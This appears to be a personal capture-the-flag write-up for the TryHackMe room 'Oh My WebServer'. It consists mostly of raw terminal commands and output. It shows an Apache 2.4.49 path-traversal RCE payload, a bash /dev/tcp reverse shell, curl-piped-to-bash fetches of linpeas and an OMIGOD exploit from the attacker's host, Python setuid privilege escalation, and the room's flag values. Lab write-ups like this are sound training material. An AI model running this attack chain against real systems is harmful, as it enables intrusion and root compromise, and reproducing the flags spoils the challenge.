# Oh My WebServer

Completion Status: In progress
Difficulty Level: Medium
Tags: Linux
Type: Challenege
URL: https://tryhackme.com/room/ohmyweb

[http://tryhackme.com/room/ohmyweb](http://tryhackme.com/room/ohmyweb)

## Nmap Scan

```bash
└─❯ nmap -p- --min-rate 1000 -T4 -A -sV -Pn -oA nmap_full_scan 10.48.171.237
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-05 13:53 +0530
Nmap scan report for 10.48.171.237
Host is up (0.0090s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-title: Consult - Business Consultancy Agency Template | Home
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|phone|storage-misc
Running (JUST GUESSING): Linux 4.X|5.X|3.X (91%), Crestron 2-Series (86%), Google Android 10.X|11.X|12.X (85%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:crestron:2_series cpe:/o:linux:linux_kernel:3 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 4.15 - 5.19 (91%), Linux 4.15 (90%), Linux 5.4 (90%), Crestron XPanel control system (86%), Linux 3.8 - 3.16 (86%), Android 10 - 12 (Linux 4.14 - 4.19) (85%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT     ADDRESS
1   8.26 ms 192.168.128.1
2   ...
3   8.61 ms 10.48.171.237

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.24 seconds

```

## Fuzzing Directories

```bash
╰─ ffuf -u "http://10.48.148.203/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r                                                                                 ─╯

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.148.203/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 9ms]
.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 9ms]
assets                  [Status: 200, Size: 404, Words: 29, Lines: 16, Duration: 24ms]
cgi-bin/                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 10ms]
:: Progress: [20481/20481] :: Job [1/1] :: 4255 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

## Searching Exploits

```bash
╰─ searchsploit 'Apache 2.4.49'                                                                                                                                                          ─╯
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                                           | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                                         | php/remote/29316.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                                       | multiple/dos/26710.txt
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)                                                                                  | multiple/webapps/50383.sh
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                                      | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                                                | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                                                | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                                                       | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                                         | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                                       | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                                                 | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                              | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                              | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                                              | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                                          | linux/remote/34.pl
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

![image.png](Oh%20My%20WebServer/image.png)

```bash
┌──[kali@Shieldbyte53]─[~/test/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution] [main ✓]
└─❯ python3 exploit.py 10.49.160.33 80 rce 'id'
[i] Host appears to be vulnerable.
[*] Working Payload: http://10.49.160.33:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh

$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)

$ bash -c 'bash -i >& /dev/tcp/192.168.158.240/4444 0>&1'

daemon@4a70924bafa0:/$ curl http://192.168.158.240:8000/linpeas.sh | bash
```

![image.png](Oh%20My%20WebServer/image%201.png)

```bash
daemon@4a70924bafa0:/$ python3
Python 3.7.3 (default, Jan 22 2021, 20:04:44) 
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system('/bin/sh')
# whoami
root
# /bin/bash -i
root@4a70924bafa0:/# whoami
root
root@4a70924bafa0:/# cd root
root@4a70924bafa0:/root# ls -la
total 28
drwx------ 1 root root   4096 Oct  8  2021 .
drwxr-xr-x 1 root root   4096 Feb 23  2022 ..
lrwxrwxrwx 1 root root      9 Oct  8  2021 .bash_history -> /dev/null
-rw-r--r-- 1 root root    570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root   4096 Oct  8  2021 .cache
-rw-r--r-- 1 root root    148 Aug 17  2015 .profile
-rw------- 1 root daemon   12 Oct  8  2021 .python_history
-rw-r--r-- 1 root root     38 Oct  8  2021 user.txt
root@4a70924bafa0:/root# cat user.txt
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
```

```bash
root@4a70924bafa0:/tmp# curl http://192.168.158.240:8000/nmap > nmap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 5805k  100 5805k    0     0  14.8M      0 --:--:-- --:--:-- --:--:-- 14.8M
root@4a70924bafa0:/tmp# nmap 172.17.0.1 -p-
bash: nmap: command not found
root@4a70924bafa0:/tmp# ls
nmap
root@4a70924bafa0:/tmp# ./nmap 172.17.0.1 -p- --min-rate 1000
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2026-05-05 11:25 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Host is up (0.000085s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:8B:34:21:DE (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 131.62 seconds
root@4a70924bafa0:/tmp#
```

```bash
root@4a70924bafa0:/tmp# ls
nmap
root@4a70924bafa0:/tmp# curl http://192.168.158.240:8000/omigod.py > omi.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2720  100  2720    0     0  90666      0 --:--:-- --:--:-- --:--:-- 90666
root@4a70924bafa0:/tmp# python3 omi.py -t 172.17.0.1 -c id
uid=0(root) gid=0(root) groups=0(root)
root@4a70924bafa0:/tmp# python3 omi.py -t 172.17.0.1 -c cat /root/root.txt
usage: omi.py [-h] -t TARGET [-c COMMAND]
omi.py: error: unrecognized arguments: /root/root.txt
root@4a70924bafa0:/tmp# python3 omi.py -t 172.17.0.1 -c "cat /root/root.txt"
THM{7f147ef1f36da9ae29529890a1b6011f}
```